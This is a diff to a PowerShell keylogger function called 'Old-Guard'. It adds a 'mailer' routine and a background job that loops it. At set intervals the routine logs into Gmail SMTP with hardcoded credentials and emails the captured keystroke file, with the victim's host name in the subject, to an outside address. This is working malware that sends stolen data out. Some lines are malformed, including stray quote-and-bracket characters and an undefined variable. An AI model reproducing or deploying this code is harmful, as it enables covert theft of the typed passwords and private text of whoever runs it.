@@ -37,6 +37,10 @@ function Old-Guard {
         [Parameter(Position = 2)]
         [Int32]
         $PollingInterval = 40
+        
+        [Parameter(Position = 3)]
+        [Int32]
+        $EmailInterval = 300
     )
 
     $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
@@ -218,14 +222,22 @@ function Old-Guard {
         }
         
     function mailer {
-    
-    
-    
+    Start-Sleep -Seconds $EmailInterval
+      $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
+      $SMTPInfo.EnableSsl = $true
+      $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', 'usedrubberducky')
+      $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com' 
+      $ReportEmail.To.Add('warof1846@gmail.com')
+      $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+      $ReportEmail.Body = 'Report 001'
+      $ReportEmail.Attachments.Add('%temp%/key_final.txt')
+      $SMTPInfo.Send($ReportEmail); $SMTPInfo.Send($ReportEmail)\""))
     }
 
     $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
 
-    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name keys | Out-Null
+    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name keys $Initil | Out-Null
+    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {mailer}} -Name mail $Initil | Out-Null
 
     if ($PSBoundParameters['CollectionInterval'])
     {
@@ -233,6 +245,7 @@ function Old-Guard {
 
         Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
             Stop-Job -Name keys
+            Stop-Job -Name mail
             Unregister-Event -SourceIdentifier ElapsedAction
 
             $Sender.Stop()
